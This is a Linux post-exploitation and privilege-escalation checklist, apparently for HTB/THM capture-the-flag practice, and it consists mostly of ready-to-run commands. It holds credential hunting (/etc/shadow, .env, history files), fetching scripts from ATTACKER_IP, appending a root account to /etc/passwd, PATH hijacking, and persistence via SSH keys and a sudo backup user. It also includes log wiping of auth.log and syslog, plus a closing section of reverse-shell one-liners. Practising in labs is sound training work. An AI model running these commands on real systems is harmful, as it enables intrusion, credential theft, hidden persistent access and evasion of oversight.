# Post-Exploitation & Privilege Escalation Master Checklist

## ☑️ Phase 1: Initial Shell Stabilization & Setup

### Shell Stabilization
- [ ] **Python TTY Method**
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  # OR
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```
- [ ] **Background and configure shell**
  ```bash
  # Press Ctrl + Z to background
  # On local machine:
  stty raw -echo; fg
  # Back in reverse shell:
  export TERM=xterm
  export SHELL=bash
  stty rows 38 columns 116
  ```
- [ ] **Alternative: Script method**
  ```bash
  script /dev/null -c bash
  ```
- [ ] **Alternative: Socat method** (if available)
  ```bash
  # Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
  # Target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
  ```

### Basic Environment Setup
- [ ] **Check current context**
  ```bash
  whoami && id
  echo $0
  echo $SHELL
  ```
- [ ] **Set up aliases**
  ```bash
  alias ll='ls -la'
  alias la='ls -la'
  alias ..='cd ..'
  ```

---

## ☑️ Phase 2: System Reconnaissance

### System Information
- [ ] **OS and kernel details**
  ```bash
  uname -a
  cat /etc/os-release
  cat /etc/issue
  cat /proc/version
  lsb_release -a
  ```
- [ ] **Architecture**
  ```bash
  uname -m
  arch
  ```
- [ ] **Network info**
  ```bash
  hostname
  hostname -f
  ```

### Current User Context
- [ ] **User details**
  ```bash
  whoami
  id
  groups
  last
  w
  ```
- [ ] **Privileges check**
  ```bash
  sudo -l
  cat /etc/sudoers 2>/dev/null
  ```
- [ ] **Check mail**
  ```bash
  ls -la /var/mail/
  ls -la /var/spool/mail/
  ```

### Network Information
- [ ] **Interfaces**
  ```bash
  ip a
  ifconfig
  cat /proc/net/fib_trie
  ```
- [ ] **Routing**
  ```bash
  ip route
  route -n
  netstat -rn
  ```
- [ ] **Connections**
  ```bash
  netstat -antup
  ss -antup
  lsof -i
  ```
- [ ] **ARP table**
  ```bash
  arp -a
  ip neigh
  ```
- [ ] **Internal services**
  ```bash
  netstat -ano
  ss -tlnp
  ```

---

## ☑️ Phase 3: User Enumeration

### System Users
- [ ] **All users**
  ```bash
  cat /etc/passwd
  cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1
  ```
- [ ] **Users with shells**
  ```bash
  cat /etc/passwd | grep bash
  ```
- [ ] **Login history**
  ```bash
  last
  lastlog
  w
  who
  ```

### User Files & Directories
- [ ] **Home directories**
  ```bash
  ls -la /home/
  ls -la /root/ 2>/dev/null
  ```
- [ ] **Hidden files**
  ```bash
  find /home -type f -name ".*" 2>/dev/null
  find /home -name "*.txt" -o -name "*.pdf" -o -name "*.config" 2>/dev/null
  ```
- [ ] **SSH keys**
  ```bash
  find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
  find / -name "authorized_keys" 2>/dev/null
  find / -name "known_hosts" 2>/dev/null
  ```

---

## ☑️ Phase 4: File System Analysis

### Interesting Files & Directories
- [ ] **Writable directories**
  ```bash
  find / -writable -type d 2>/dev/null
  find / -perm -222 -type d 2>/dev/null
  find / -perm -o+w -type d 2>/dev/null
  ```
- [ ] **World writable files**
  ```bash
  find / -perm -2 -type f 2>/dev/null
  find / -perm -o+w -type f 2>/dev/null
  ```
- [ ] **Configuration files**
  ```bash
  find /etc -type f -name "*.conf" 2>/dev/null
  find /etc -type f -name "*.config" 2>/dev/null
  ls -la /etc/
  ```
- [ ] **Log files**
  ```bash
  find /var/log -type f -exec ls -la {} \; 2>/dev/null
  ```

### SUID/SGID Files
- [ ] **SUID files**
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  find / -perm -4000 -type f 2>/dev/null
  ```
- [ ] **SGID files**
  ```bash
  find / -perm -g=s -type f 2>/dev/null
  find / -perm -2000 -type f 2>/dev/null
  ```
- [ ] **Combined SUID/SGID**
  ```bash
  find / -perm -6000 -type f 2>/dev/null
  ```
- [ ] **Check against GTFOBins** - Compare found binaries with https://gtfobins.github.io/

### Capabilities
- [ ] **Files with capabilities**
  ```bash
  getcap -r / 2>/dev/null
  find /usr/bin -exec getcap {} \; 2>/dev/null
  ```

---

## ☑️ Phase 5: Process & Service Analysis

### Running Processes
- [ ] **Current processes**
  ```bash
  ps aux
  ps -ef
  ps -elf
  pstree
  ```
- [ ] **Root processes**
  ```bash
  ps aux | grep root
  ps -ef | grep root
  ```
- [ ] **Process monitoring**
  ```bash
  # Save process list
  ps aux > /tmp/ps1
  # Wait 2-3 minutes, then:
  ps aux > /tmp/ps2
  diff /tmp/ps1 /tmp/ps2
  ```

### Services & Daemons
- [ ] **System services**
  ```bash
  systemctl list-units --type=service
  systemctl list-units --type=service --state=running
  service --status-all
  ```
- [ ] **Enabled services**
  ```bash
  systemctl list-unit-files --type=service --state=enabled
  ```
- [ ] **Service configurations**
  ```bash
  systemctl show [service-name]
  ```

---

## ☑️ Phase 6: Scheduled Tasks & Jobs

### Cron Jobs
- [ ] **System crontabs**
  ```bash
  cat /etc/crontab
  ls -la /etc/cron.*
  cat /etc/cron.d/* 2>/dev/null
  cat /etc/cron.daily/* 2>/dev/null
  cat /etc/cron.hourly/* 2>/dev/null
  cat /etc/cron.monthly/* 2>/dev/null
  cat /etc/cron.weekly/* 2>/dev/null
  ```
- [ ] **User crontabs**
  ```bash
  crontab -l
  crontab -l -u root 2>/dev/null
  ls -la /var/spool/cron/
  ls -la /var/spool/cron/crontabs/
  ```
- [ ] **Writable cron scripts**
  ```bash
  find /etc/cron* -type f -perm -o+w 2>/dev/null
  ```

### Systemd Timers
- [ ] **List timers**
  ```bash
  systemctl list-timers --all
  systemctl list-timers
  ```
- [ ] **Timer configurations**
  ```bash
  find /etc/systemd -name "*.timer" -exec cat {} \; 2>/dev/null
  ```

---

## ☑️ Phase 7: Software & Package Analysis

### Installed Software
- [ ] **Debian/Ubuntu packages**
  ```bash
  dpkg -l
  apt list --installed
  apt list --upgradable 2>/dev/null
  ```
- [ ] **Red Hat/CentOS packages**
  ```bash
  rpm -qa
  yum list installed
  dnf list installed
  ```
- [ ] **Manually installed software**
  ```bash
  ls -la /opt/
  ls -la /usr/local/
  find /usr/local -type f -perm -o+x 2>/dev/null
  ```

### Development Tools
- [ ] **Compilers and tools**
  ```bash
  which gcc g++ python python3 perl ruby php node npm
  find / -name gcc -o -name g++ 2>/dev/null
  ```
- [ ] **Language versions**
  ```bash
  python --version
  python3 --version
  perl --version
  ruby --version
  ```

---

## ☑️ Phase 8: Environment Variables & PATH

### Environment Analysis
- [ ] **All variables**
  ```bash
  env
  printenv
  set
  ```
- [ ] **PATH analysis**
  ```bash
  echo $PATH
  find /usr/bin -type f -perm -o+w 2>/dev/null
  find /usr/sbin -type f -perm -o+w 2>/dev/null
  ```

### Library Paths
- [ ] **Library configuration**
  ```bash
  echo $LD_LIBRARY_PATH
  cat /etc/ld.so.conf
  cat /etc/ld.so.conf.d/* 2>/dev/null
  ldconfig -p
  ```

---

## ☑️ Phase 9: Database & Application Analysis

### Database Files
- [ ] **SQLite databases**
  ```bash
  find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
  ```
- [ ] **MySQL/MariaDB**
  ```bash
  ls -la /var/lib/mysql/
  cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null
  ```
- [ ] **PostgreSQL**
  ```bash
  ls -la /var/lib/postgresql/
  cat /etc/postgresql/*/main/postgresql.conf 2>/dev/null
  ```

### Web Applications
- [ ] **Web directories**
  ```bash
  ls -la /var/www/
  ls -la /var/www/html/
  ls -la /usr/share/nginx/html/
  find /var/www -type f -name "*.php" -o -name "*.config" 2>/dev/null
  ```
- [ ] **Web server configs**
  ```bash
  cat /etc/apache2/sites-available/* 2>/dev/null
  cat /etc/nginx/sites-available/* 2>/dev/null
  ```

---

## ☑️ Phase 10: Credentials & Secrets Hunting

### Configuration Files
- [ ] **System credential files**
  ```bash
  cat /etc/passwd
  cat /etc/shadow 2>/dev/null
  cat /etc/group
  ```
- [ ] **Config files with secrets**
  ```bash
  find /etc -type f \( -name "*.conf" -o -name "*.config" \) -exec grep -l "password\|pass\|pwd\|secret\|key" {} \; 2>/dev/null
  ```
- [ ] **Environment files**
  ```bash
  find / -name ".env" 2>/dev/null
  find / -name "*.env" 2>/dev/null
  cat .env 2>/dev/null
  ```

### History Files
- [ ] **Command history**
  ```bash
  cat ~/.bash_history 2>/dev/null
  cat ~/.zsh_history 2>/dev/null
  cat ~/.history 2>/dev/null
  find /home -name ".*history" -exec cat {} \; 2>/dev/null
  ```
- [ ] **Database history**
  ```bash
  cat ~/.mysql_history 2>/dev/null
  ```

### Memory & Process Analysis
- [ ] **Process memory dump** (if gdb available)
  ```bash
  ps aux | grep -v grep | grep [target_process]
  # gdb -p [PID] -> generate-core-file -> strings core.[PID] | grep -i pass
  ```
- [ ] **Process info in /proc**
  ```bash
  find /proc -name cmdline 2>/dev/null | xargs grep -l "password\|pass" 2>/dev/null
  ```

---

## ☑️ Phase 11: Automated Enumeration Tools

### LinEnum
- [ ] **Download and execute**
  ```bash
  wget http://[ATTACKER_IP]:8000/LinEnum.sh
  chmod +x LinEnum.sh
  ./LinEnum.sh -t
  ```

### LinPEAS
- [ ] **Download and execute**
  ```bash
  wget http://[ATTACKER_IP]:8000/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh | tee linpeas_output.txt
  ```

### Linux Smart Enumeration (LSE)
- [ ] **Download and execute**
  ```bash
  wget http://[ATTACKER_IP]:8000/lse.sh
  chmod +x lse.sh
  ./lse.sh -l 2
  ```

### pspy (Process Monitoring)
- [ ] **Download and execute**
  ```bash
  wget http://[ATTACKER_IP]:8000/pspy64
  chmod +x pspy64
  ./pspy64
  ```

---

## ☑️ Phase 12: Kernel Exploits

### Kernel Information
- [ ] **Get kernel version**
  ```bash
  uname -r
  uname -a
  cat /proc/version
  ```
- [ ] **Research kernel exploits**
  ```bash
  # Use searchsploit locally: searchsploit linux kernel [version]
  ```

### Common Kernel Exploits to Check
- [ ] **Dirty COW (CVE-2016-5195)** - Kernel 2.6.22 < 4.8.3
- [ ] **Ubuntu 16.04 Overlayfs (CVE-2015-1328)**
- [ ] **CentOS/RHEL American Fuzzy Lop (CVE-2016-0728)**

---

## ☑️ Phase 13: Container Escape (if applicable)

### Container Detection
- [ ] **Check if in container**
  ```bash
  cat /proc/1/cgroup
  ls -la /.dockerenv
  cat /.dockerenv 2>/dev/null
  cat /proc/self/mountinfo | grep docker
  ```

### Container Escape
- [ ] **Check privileges**
  ```bash
  capsh --print
  cat /proc/self/status | grep Cap
  ```
- [ ] **Mount analysis**
  ```bash
  findmnt
  mount | grep docker
  ```

---

## ☑️ Phase 14: Privilege Escalation Execution

### Quick Wins
- [ ] **Sudo without password**
  ```bash
  sudo -n -l
  ```
- [ ] **NOPASSWD entries**
  ```bash
  cat /etc/sudoers | grep NOPASSWD
  ```
- [ ] **Writable /etc/passwd**
  ```bash
  ls -la /etc/passwd
  # If writable: echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
  ```
- [ ] **SUID binaries** - Check found SUID binaries against GTFOBins

### Path Hijacking
- [ ] **Identify vulnerable binaries**
  ```bash
  # From process monitoring or script analysis
  echo $PATH
  ```
- [ ] **Create malicious binary**
  ```bash
  echo '#!/bin/bash\n/bin/bash -i' > /tmp/vulnerable_binary
  chmod +x /tmp/vulnerable_binary
  export PATH=/tmp:$PATH
  ```

---

## ☑️ Phase 15: Post-Privilege Escalation

### Maintain Access
- [ ] **Add SSH key**
  ```bash
  mkdir /root/.ssh 2>/dev/null
  echo 'your_public_key' >> /root/.ssh/authorized_keys
  chmod 600 /root/.ssh/authorized_keys
  chmod 700 /root/.ssh
  ```
- [ ] **Create backup user**
  ```bash
  useradd -m backup -s /bin/bash
  echo 'backup:password' | chpasswd
  usermod -aG sudo backup
  ```

### Flag Collection
- [ ] **Find flags**
  ```bash
  find / -name "user.txt" 2>/dev/null
  find / -name "root.txt" 2>/dev/null
  find / -name "flag.txt" 2>/dev/null
  ls -la /root/
  ls -la /home/*/Desktop/
  ```

### Evidence Cleanup (if required)
- [ ] **Clear history**
  ```bash
  history -c
  > ~/.bash_history
  > /var/log/auth.log
  > /var/log/syslog
  ```
- [ ] **Remove files**
  ```bash
  rm /tmp/linpeas.sh
  rm /tmp/LinEnum.sh
  rm /tmp/pspy64
  ```

---

## ☑️ Phase 16: Documentation & Reporting

### Document Findings
- [ ] **Save exploitation path**
  ```bash
  echo "Privilege escalation method: [METHOD]" > /tmp/notes.txt
  echo "Vulnerable service/file: [PATH]" >> /tmp/notes.txt
  echo "Commands used: [COMMANDS]" >> /tmp/notes.txt
  ```
- [ ] **Take screenshots**
  - [ ] Initial shell
  - [ ] Enumeration results
  - [ ] Exploit execution
  - [ ] Root shell
  - [ ] Flag contents

---

## 🚨 Emergency Shell Recovery

### Reverse Shell One-liners
- [ ] **Bash**
  ```bash
  bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
  ```
- [ ] **Python**
  ```bash
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- [ ] **Netcat**
  ```bash
  nc -e /bin/sh ATTACKER_IP PORT
  ```
- [ ] **Named pipe**
  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
  ```

---

## 🎯 Pro Tips for HTB/THM Success

### Priority Checklist
- [ ] **Always stabilize shell first** - saves time and frustration
- [ ] **Run automated tools while doing manual enumeration** - parallel approach
- [ ] **Check GTFOBins for any SUID/sudo binaries** - quick reference
- [ ] **Monitor processes with pspy** - catches scheduled tasks
- [ ] **Look for version numbers** - everything can be exploited
- [ ] **Check file permissions thoroughly** - world-writable files are gold
- [ ] **Read configuration files carefully** - credentials hide everywhere
- [ ] **Don't forget about groups** - group permissions matter
- [ ] **Check for Docker/container environments** - different techniques needed
- [ ] **Document everything** - you'll need it for reports

### Common Privilege Escalation Paths
- [ ] **Writable files in PATH directories**
- [ ] **SUID binaries (especially custom ones)**
- [ ] **Sudo misconfigurations**
- [ ] **Cron jobs running as root with writable scripts**
- [ ] **Kernel exploits on older systems**
- [ ] **Database credentials in config files**
- [ ] **SSH keys in unusual places**
- [ ] **Capabilities on binaries**
- [ ] **NFS root_squash misconfigurations**
- [ ] **Docker socket access**